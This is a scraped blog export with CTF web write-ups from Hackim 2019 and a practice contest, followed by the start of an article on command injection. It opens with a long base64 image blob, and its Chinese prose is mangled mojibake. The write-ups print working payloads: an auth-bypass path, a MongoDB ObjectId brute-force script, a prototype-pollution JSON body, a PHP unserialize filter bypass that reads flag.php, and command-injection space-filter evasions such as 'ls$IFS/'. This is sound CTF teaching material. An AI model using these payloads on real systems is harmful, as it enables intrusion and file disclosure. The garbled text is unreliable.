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\u0026#34;\u0026gt; æ‰€ä»¥é€šè¿‡è¿™äº›å‡ ä¸ªè®¾ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°trackuser.phpä¸­è¯·æ±‚å‚æ•°mçš„å€¼ä¸º 2656613544186699742 ï¼Œå‘åŒ…å¾—åˆ°å¯¹åº”çš„ Cookie\n \nå¸¦ç€ Cookie ç™»å½• admin/adminï¼Œå¾—åˆ°ä¸‹ä¸€æ­¥\n \nç›´æ¥è®¿é—®ï¼Œå‘ç°æ˜¯ä¸ªç›®å½•åˆ—ä¸¾ã€‚\n \nç›´æ¥è®¿é—®admin.phpï¼Œå‘ç°not_authorized\n \nè€Œpack-9d392b4893d01af61c5712fdf5aafd8f24d06a10.packæ–‡ä»¶åˆ™å¯ä»¥ç›´æ¥ä¸‹è½½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡git tips åªæœ‰ä¸€ä¸ª pack æ–‡ä»¶æ¢å¤æ•´ä¸ªç³»ç»Ÿ\n \nå¾—åˆ°admin.phpæ–‡ä»¶\n\u0026lt;?php if ($_SESSION[\u0026#39;go\u0026#39;]) { $sp_php = explode(\u0026#39;/\u0026#39;, $_SERVER[\u0026#39;PHP_SELF\u0026#39;]); $langfilename = $sp_php[count($sp_php) - 1]; $pageListArray = array(\u0026#39;index.php\u0026#39; =\u0026gt; \u0026#34;1\u0026#34;); if ($pageListArray[$langfilename] != 1) { echo \u0026#34;not_authorized\u0026#34;; Header(\u0026#34;Location: index.php?not_authorized\u0026#34;); } else { echo \u0026#34;hackim19{}\u0026#34;; } } else { echo \u0026#34;you need to complete the first barrier\u0026#34;; } ?\u0026gt;ç®€å•å®¡è®¡ï¼Œè·å–è·¯å¾„åæ£€æŸ¥index.phpæ˜¯å¦å­˜åœ¨è·¯å¾„å½“ä¸­ï¼Œæˆ‘ä»¬ç”¨admin.php/index.phpå°±å¯ä»¥ç®€å•ç»•è¿‡å¾—åˆ° flag\n \nproton  â€‹\tAlice web site has been hacked and hackers removed the submit post option and posted some unwanted messages can you get them?\nHint\n mango can be eaten in 60 seconds Mongo Mongo Mongo !!! and this is not a sql Injection   é¢˜ç›®è®¾ç½®\n \nè®¿é—®/getPOSTåˆå¾—åˆ°\n \næ·»åŠ idå‚æ•°è®¿é—®\n \nå•å¼•å·å°è¯•æ³¨å…¥ï¼Œå‘ç°æŠ¥é”™\n \næ³¨å…¥æ— æœåï¼Œçœ‹äº†ä¸€ä¸‹å‘ç°æ˜¯ä¸ª Node.js çš„ç«™ï¼Œå°è¯•ä½¿ç”¨ä¹‹å‰çš„ payload æ£€æŸ¥é”™è¯¯ä¿¡æ¯\n \nç„¶è€Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ç–‘çš„jsåº“ï¼Œè€Œä¸”é¢˜ç›®æ—¢ç„¶ç»™å‡ºäº†ä¸æ˜¯ sql æ³¨å…¥çš„è¯ï¼Œæˆ‘ä»¬å°±éœ€è¦å¾—å¦æ‰¾æ–¹å‘ã€‚\nMongoDB ä¸­æœ‰ä¸€ä¸ªObjectIdçš„æ¦‚å¿µï¼Œå®ƒæ˜¯ä¸€ç§ MongoDB çš„ç±»å‹\n â€‹\tObjectIds are small, likely unique, fast to generate, and ordered. ObjectId values consist of 12 bytes, where the first four bytes are a timestamp that reflect the ObjectIdâ€™s creation. Specifically:\n a 4-byte value representing the seconds since the Unix epoch, a 5-byte random value, and a 3-byte counter, starting with a random value.   å‚è€ƒAngstrom CTF 2018] The Best Website Write-up (Web230)ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸­é—´5ä½è™½ç„¶éšæœºäº§ç”Ÿï¼Œä½†æ˜¯æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯çŒœè§£å‰4ä½ä»¥åŠå3ä½ã€‚è€Œé¢˜ç›®ç»™å‡º hint æ„æ€æ˜¯æ—¶é—´å·®åº”è¯¥æ˜¯å°äºç­‰äº 60s ï¼Œç„¶åæœ€åä¸‰ä½æ ¹æ®ä¸€å¼€å§‹ç»™å‡ºçš„id=5c51b9c9144f813f31a4c0e2ï¼Œä»a4c0e2å¼€å§‹+1æšä¸¾åˆ°a4c0efï¼Œä½†æ˜¯è¿™é“é¢˜æ¯”è¾ƒå‘çš„åœ°æ–¹ä¹Ÿå°±åœ¨è¿™ï¼Œæœ€åé¢˜ç›®é¡ºåºå¹¶ä¸æ˜¯ä»è¿™é¡ºæ¨çš„ï¼Œè€Œæ˜¯é€†åºæšä¸¾çš„ï¼Œè€Œä¸”æ—¶é—´ä¹Ÿä¸æ˜¯æ•´ 60s ï¼Œæ‰€ä»¥è¿˜éœ€è¦å‘å‰æšä¸¾ã€‚è¿™é‡Œæ¨èå¤§å®¶ä½¿ç”¨MongoDB ObjectId â†” Timestamp Converteræ–¹ä¾¿æŸ¥çœ‹æ—¶é—´æˆ³\nimport requests url = \u0026#39;http://localhost:4545/getPOST?id=%s144f813f31%s\u0026#39; time = 0x5c51b9c9 counter = 0xa4c0e2 for i in range(100): counter = hex(counter - 1)[2:] for i in range(1000000): time = hex(time - 1)[2:] nurl = url % (time, counter) res = requests.get(nurl) if \u0026#39;Not found\u0026#39; not in res.text: print(res.text, nurl) time = int(time, 16) counter = int(counter, 16) break time = int(time, 16) ç»ˆäºåœ¨id=5c51b911144f813f31a4c0dfå¾—åˆ°å…³é”®ä¿¡æ¯\nI told you you follow the White Rabbit. http://localhost:4545/getPOST?id=5c51b98d144f813f31a4c0e1 Did you actually come back ?? Go Away! http://localhost:4545/getPOST?id=5c51b952144f813f31a4c0e0 Shit MR Anderson and his agents are here. Hurryup!. Pickup the landline phone to exit back to matrix! - /4f34685f64ec9b82ea014bda3274b0df/ http://localhost:4545/getPOST?id=5c51b911144f813f31a4c0df è®¿é—®/5c51b911144f813f31a4c0dfå¾—åˆ°æºç \n\u0026#39;use strict\u0026#39;; const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;) const cookieParser = require(\u0026#39;cookie-parser\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const isObject = obj =\u0026gt; obj \u0026amp;\u0026amp; obj.constructor \u0026amp;\u0026amp; obj.constructor === Object; function merge(a,b){ for (var attr in b){ if(isObject(a[attr]) \u0026amp;\u0026amp; isObject(b[attr])){ merge(a[attr],b[attr]); } else{ a[attr] = b[attr]; } } return a } function clone(a){ return merge({},a); } // Constants const PORT = 8080; const HOST = \u0026#39;0.0.0.0\u0026#39;; const admin = {}; // App const app = express(); app.use(bodyParser.json()) app.use(cookieParser()); app.use(\u0026#39;/\u0026#39;, express.static(path.join(__dirname, \u0026#39;views\u0026#39;))) app.post(\u0026#39;/signup\u0026#39;, (req, res) =\u0026gt; { var body = JSON.parse(JSON.stringify(req.body)); var copybody = clone(body) if(copybody.name){ res.cookie(\u0026#39;name\u0026#39;, copybody.name).json({\u0026#34;done\u0026#34;:\u0026#34;cookie set\u0026#34;}); } else{ res.json({\u0026#34;error\u0026#34;:\u0026#34;cookie not set\u0026#34;}) } }); app.get(\u0026#39;/getFlag\u0026#39;, (req, res) =\u0026gt; { var Ğ°dmin=JSON.parse(JSON.stringify(req.cookies)) if(admin.Ğ°dmin==1){ res.send(\u0026#34;hackim19{}\u0026#34;); } else{ res.send(\u0026#34;You are not authorized\u0026#34;); } }); app.listen(PORT, HOST); console.log(`Running on http://${HOST}:${PORT}`); éœ€è¦æˆ‘ä»¬å°†const adminçš„adminå±æ€§è®¾ç½®ä¸º1ï¼Œæ¯”è¾ƒæ˜æ˜¾çš„ä¸€ä¸ª js åŸå‹é“¾æ±¡æŸ“ï¼Œæˆ‘ä»¬åªéœ€è¦è®©ä¸€ä¸ªObject.prototypeè®¾ç½®ä¸º{\u0026quot;admin\u0026quot;:1}å³å¯ï¼Œè€Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªnameå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§è‡´å¯ä»¥è¿™æ ·æ„é€ ï¼š{\u0026quot;name\u0026quot;: \u0026quot;xxx\u0026quot;, \u0026quot;__proto__\u0026quot;:{\u0026quot;Ğ°dmin\u0026quot;:\u0026quot;1\u0026quot;}}\n \nåœ¨ç¬¬äºŒä¸ªforå¾ªç¯ä¸­ï¼Œç”±äº__proto__æ˜¯ä¸€ä¸ªObjectï¼Œä¼šé€’å½’è¿›å…¥merge()ï¼Œç”±äº__proto__æœ‰ä¸€å¯¹key-valueï¼Œæ‰€ä»¥ä¼šåˆ¤æ–­__proto__[\u0026quot;admin\u0026quot;]æ˜¯å¦æ˜¯Objectï¼Œä¸æ˜¯å°±è¿›å…¥elseï¼Œå¯¹åŸå‹__proto__[\u0026quot;admin\u0026quot;]èµ‹å€¼ä¸º1ï¼Œè¿™å°±å®Œæˆäº†åŸå‹é“¾æ±¡æŸ“çš„æ“ä½œã€‚\næœ€åè®¿é—®/getFlagæˆåŠŸè·å¾—flag\nhackim19{Prototype_for_the_win} å›½å†…å…³äºåŸå‹é“¾çš„æ–‡ç« è¿˜æ˜¯æ¯”è¾ƒå°‘çš„ï¼Œæ¨èä¸€ç¯‡æ¢…å­é…’å¸ˆå‚…å†™çš„JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼Œå†™çš„è¿˜æ˜¯ä¸é”™çš„ã€‚\n","date":"2019-02-14T18:46:10Z","permalink":"https://blog.zeddyu.info/2019/02/14/Hackim-2019/","title":"Hackim-2019 Web è®°å½•"},{"content":"é—²æ¥æ— äº‹æƒ³èµ·å®‰æ’å¼€äº†1æœˆçš„å‘¨å‘¨ç»ƒï¼Œå°±æ‹¿æ¥ç»ƒç»ƒæ‰‹ã€‚\nè‡ªå·±åªåšäº†webçš„éƒ¨åˆ†ã€‚\nWeb1 easy é¢˜ç›®å¾ˆç›´æ¥çš„ç»™å‡ºäº†æºç \n\u0026lt;?php @error_reporting(1); include \u0026#39;flag.php\u0026#39;; class baby { public $file; function __toString() { if(isset($this-\u0026gt;file)) { $filename = \u0026#34;./{$this-\u0026gt;file}\u0026#34;; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } if (isset($_GET[\u0026#39;data\u0026#39;])) { $data = $_GET[\u0026#39;data\u0026#39;]; preg_match(\u0026#39;/[oc]:\\d+:/i\u0026#39;,$data,$matches); if(count($matches)) { die(\u0026#39;Hacker!\u0026#39;); } else { $good = unserialize($data); echo $good; } } else { highlight_file(\u0026#34;./index.php\u0026#34;); } ?\u0026gt;å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªphpååºåˆ—åŒ–æ¼æ´ï¼Œä½†æ˜¯éœ€è¦ç»•è¿‡/[oc]:\\d+:/iè¿™ä¸ªæ¡ä»¶ï¼Œè€Œæˆ‘ä»¬å¯¹è±¡åºåˆ—åŒ–å‡ºæ¥çš„å¿…é¡»æ˜¯\nO:num:\u0026quot;name\u0026quot;:1:{...} è¿™ä¹ˆä¸€ä¸ªæ ¼å¼ï¼Œé€ƒä¸è¿‡è¿™ä¸ªæ­£åˆ™çš„åˆ¤æ–­ï¼Œä¹Ÿæ‰¾åˆ°äº†phpåºåˆ—åŒ–çš„å¼€å¤´å­—æ¯ä»£è¡¨ã€‚\na - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string å°è¯•ç”¨ä¸åŒçš„å­—æ¯ç»•è¿‡ï¼Œæ¯”å¦‚è¯´ç”¨Rï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹ä¸è¡Œã€‚ä¹Ÿå‚è€ƒäº†ä¸€ä¸‹PHP stringåºåˆ—åŒ–ä¸ååºåˆ—åŒ–è¯­æ³•è§£æä¸ä¸€è‡´å¸¦æ¥çš„å®‰å…¨éšæ‚£ï¼Œå‘ç°æˆ–è®¸æœ‰ä»€ä¹ˆåºåˆ—åŒ–çš„å°trickï¼Œä¹Ÿå¸¸ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•æˆ–è€…åå…­è¿›åˆ¶ç»•è¿‡ï¼Œä½†æ˜¯ç›´æ¥æŠ¥é”™äº†ã€‚\nç„¶åå‘ç°äº†phpååºåˆ—unserializeçš„ä¸€ä¸ªå°ç‰¹æ€§ï¼Œå¯ä»¥åœ¨O:4:ä¸­é—´åŠ å…¥+ï¼Œå˜æˆO:+4:è¿™æ ·ï¼Œä¸åŸæ•ˆæœä¸€è‡´ï¼Œä¸»è¦åŸå› å°±æ˜¯å› ä¸ºphpå¯¹+çš„è¯æ³•è§£ææ˜¯åšäº†å†çœ‹ä¸‹ä¸€ä½åˆ¤æ–­ã€‚\næ‰€ä»¥è¿™é¢˜åªè¦åŠ ä¸Š+ç»•è¿‡å°±å¥½äº†ï¼Œè®°å¾—ç”¨urlç¼–ç å°±å¥½ã€‚\n?data=O:+4:\u0026quot;baby\u0026quot;:1:{s:4:\u0026quot;file\u0026quot;;s:8:\u0026quot;flag.php\u0026quot;;} ?data=O%3A%2B4%3A\u0026quot;baby\u0026quot;%3A1%3A%7Bs%3A4%3A\u0026quot;file\u0026quot;%3Bs%3A8%3A\u0026quot;flag.php\u0026quot;%3B%7D å¾—åˆ°flag\n \nWeb2 ezweb2 å‘ç°Cookieé‡Œæœ‰user=dXNlcg%3D%3Dï¼Œbase64è§£ç å¾—åˆ°user=userï¼Œå°è¯•æ”¹ä¸ºadminï¼Œç›´æ¥è¿›å…¥åˆ°äº†admin.phpçš„åå°ã€‚\n \néšä¾¿è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œã€‚å‘½ä»¤æ‰§è¡Œå¯ä»¥å‚è€ƒæˆ‘ä¸Šç¯‡æ–‡ç« ï¼Œå·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼ã€‚\nlså¯ä»¥å¾—åˆ°\n \néšä¾¿fuzzäº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ç”¨cat\u0026lt;\u0026gt;config.phpç›´æ¥è¯»å–æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚\nConfig.php:\n\u0026lt;?php session_start(); function waf_exec($str){ $black_str = \u0026#34;/(;|\u0026amp;|\u0026gt;|}|{|%|#|!|\\?|@|\\+| )/i\u0026#34;; $str = preg_replace($black_str, \u0026#34;\u0026#34;,$str); return $str; } Admin.php\n\u0026lt;?php include \u0026#39;config.php\u0026#39;; if (!isset($_SESSION[\u0026#39;admin\u0026#39;])||$_SESSION[\u0026#39;admin\u0026#39;]===false) { die(\u0026#34;You are not admin...\u0026#34;); } if (@$_POST[\u0026#39;cmd\u0026#39;]) { $cmd = waf_exec($_POST[\u0026#39;cmd\u0026#39;]); $retval = array(); exec($cmd, $retval, $status); // var_dump($retval); \tif ($status == 0) { $res = implode(\u0026#34;\\n\u0026#34;,$retval); }else{ $res = \u0026#39;error\u0026#39;; } }else{ $res = \u0026#39;\u0026#39;; } include \u0026#39;./templates/admin.html\u0026#39;; index.php\n\u0026lt;?php include \u0026#39;config.php\u0026#39;; $userdata = @$_COOKIE[\u0026#39;user\u0026#39;]; if (!$userdata) { setcookie(\u0026#34;user\u0026#34;,base64_encode(\u0026#39;user\u0026#39;)); $_SESSION[\u0026#39;admin\u0026#39;] = false; }else{ $user = base64_decode($userdata); if ($user == \u0026#39;admin\u0026#39;) { $_SESSION[\u0026#39;admin\u0026#39;] = true; header(\u0026#34;Location: admin.php\u0026#34;); } } include \u0026#39;./templates/index.html\u0026#39;; æ‰¾äº†å‡ ä¸ªç›®å½•éƒ½æ‰¾ä¸åˆ°flagï¼Œçœ‹æ¥åº”è¯¥è¦åˆ°åˆ—ç›®å½•æ‰å¯ä»¥ï¼Œä½†æ˜¯åˆè¿‡æ»¤äº†ç©ºæ ¼ï¼Œå°±æ²¡åŠæ³•ç”¨ls ..è¿™æ ·ï¼Œä½†æ˜¯ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•å¾ˆå¤šï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥ç”¨ls$IFS/ç»•è¿‡ç©ºæ ¼ã€‚\n \nçœ‹åˆ°flagæ–‡ä»¶åå­—ï¼Œç›´æ¥è¯»å°±å¥½äº†ã€‚\n \næ€»ç»“ æ•´ä½“æ¥è¯´é¢˜ç›®è¿˜æ˜¯ä¸é”™çš„ã€‚è¿˜æ˜¯å¯ä»¥å­¦åˆ°ä¸€ç‚¹ä¸œè¥¿çš„ã€‚å°¤å…¶æ˜¯web1çš„å°trickï¼Œå¯¹äºåœ¨ç»•wafä¹Ÿæœ‰ä¸€å®šçš„ä½œç”¨ã€‚\n","date":"2019-01-22T15:54:15Z","permalink":"https://blog.zeddyu.info/2019/01/22/%E5%AE%89%E6%81%921%E6%9C%88%E5%91%A8%E5%91%A8%E7%BB%83/","title":"å®‰æ’1æœˆå‘¨å‘¨ç»ƒ"},{"content":" â€‹\tæœ¬æ–‡é¦–å‘äºè¡¥å¤©å¹³å°ï¼Œåœ°å€ï¼šhttps://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw\n åœ¨NUAACTF_2018ä¸­ï¼Œæˆ‘å‡ºäº†ä¸€é“æ¯”è¾ƒæ°´çš„é‡‡ç”¨Springæ¡†æ¶çš„SSRF+Java Deserialization+Command Injectionã€‚ä¸ªäººè§‰å¾—åœ¨å‡ºé¢˜æ—¶å€™ä¹Ÿå­¦ä¹ åˆ°äº†ä¸å°‘çŸ¥è¯†ï¼Œç‰¹åˆ«æ˜¯åœ¨Command Injectionè¿™ä¸€å—è®©æˆ‘å¯¹Command Injectionæœ‰äº†æ–°çš„çœ‹æ³•ã€‚\nå‘½ä»¤æ‰§è¡Œ ç†è®ºåŸºç¡€  Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.\nThis attack differs from Code Injection, in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.\n ä»¥ä¸Šæ¥è‡ªCommand Injection - OWASPï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯é€šè¿‡æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºåœ¨ä¸»æœºæ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å½“åº”ç”¨ç¨‹åºå°†ä¸å®‰å…¨çš„ç”¨æˆ·æä¾›çš„æ•°æ®ï¼ˆè¡¨å•ï¼Œcookieï¼ŒHTTPæ ‡å¤´ç­‰ï¼‰ä¼ é€’ç»™ç³»ç»Ÿshellæ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚ åœ¨æ­¤æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æä¾›çš„æ“ä½œç³»ç»Ÿå‘½ä»¤é€šå¸¸ä»¥æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„æƒé™æ‰§è¡Œã€‚ å‘½ä»¤æ³¨å…¥æ”»å‡»å¾ˆå¯èƒ½ä¸»è¦æ˜¯ç”±äºè¾“å…¥éªŒè¯ä¸è¶³ã€‚æ­¤æ”»å‡»ä¸ä»£ç æ³¨å…¥ä¸åŒï¼Œå› ä¸ºä»£ç æ³¨å…¥å…è®¸æ”»å‡»è€…æ·»åŠ è‡ªå·±çš„ä»£ç ï¼Œç„¶åç”±åº”ç”¨ç¨‹åºæ‰§è¡Œã€‚ åœ¨å‘½ä»¤æ³¨å…¥ä¸­ï¼Œæ”»å‡»è€…æ‰©å±•äº†æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„åº”ç”¨ç¨‹åºçš„é»˜è®¤åŠŸèƒ½ï¼Œè€Œæ— éœ€æ³¨å…¥ä»£ç ã€‚\n â€‹\tå‘½ä»¤æ³¨å…¥æ”»å‡»æœ€åˆè¢«ç§°ä¸ºShellå‘½ä»¤æ³¨å…¥æ”»å‡»ï¼Œæ˜¯ç”±æŒªå¨ä¸€åç¨‹åºå‘˜åœ¨1997å¹´æ„å¤–å‘ç°çš„ã€‚ç¬¬ä¸€ä¸ªå‘½ä»¤æ³¨å…¥æ”»å‡»ç¨‹åºèƒ½éšæ„åœ°ä»ä¸€ä¸ªç½‘ç«™åˆ é™¤ç½‘é¡µï¼Œå°±åƒä»ç£ç›˜æˆ–è€…ç¡¬ç›˜ç§»é™¤æ–‡ä»¶ä¸€æ ·ç®€å•ã€‚\tâ€”â€”ç™¾åº¦ç™¾ç§‘\n ç‰¹æ®Šç¬¦å· è®²åˆ°å‘½ä»¤æ³¨å…¥ï¼Œå°±ä¸å¾—ä¸æåˆ°ç‰¹æ®Šç¬¦å·çš„è¿ç”¨ã€‚ä¾‹å¦‚ä¸Šé¢ä¾‹å­ä¸­çš„|ç®¡é“ç¬¦ï¼Œè¿˜æœ‰æ¯”è¾ƒå¤šçš„ç±»ä¼¼æœ‰å¥‡æ•ˆçš„ç¬¦å·ç»„åˆã€‚\n| è¿ç»“ä¸Šä¸ªæŒ‡ä»¤çš„æ ‡å‡†è¾“å‡ºï¼Œåšä¸ºä¸‹ä¸ªæŒ‡ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚\n\u0026amp; ç”¨æˆ·æœ‰æ—¶å€™æ‰§è¡Œå‘½ä»¤è¦èŠ±å¾ˆé•¿æ—¶é—´ï¼Œå¯èƒ½ä¼šå½±å“åšå…¶ä»–äº‹æƒ…ã€‚æœ€å¥½çš„æ–¹æ³•æ˜¯å°†å®ƒæ”¾åœ¨åå°æ‰§è¡Œã€‚åå°è¿è¡Œçš„ç¨‹åºåœ¨ç”¨æˆ·æ³¨é”€åç³»ç»Ÿè¿˜å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚å½“è¦æŠŠå‘½ä»¤æ”¾åœ¨åå°æ‰§è¡Œæ—¶ï¼Œåœ¨å‘½ä»¤çš„åé¢åŠ ä¸Š\u0026amp;ã€‚\nLinuxä¸­çš„\u0026amp;\u0026amp;ä¸|| 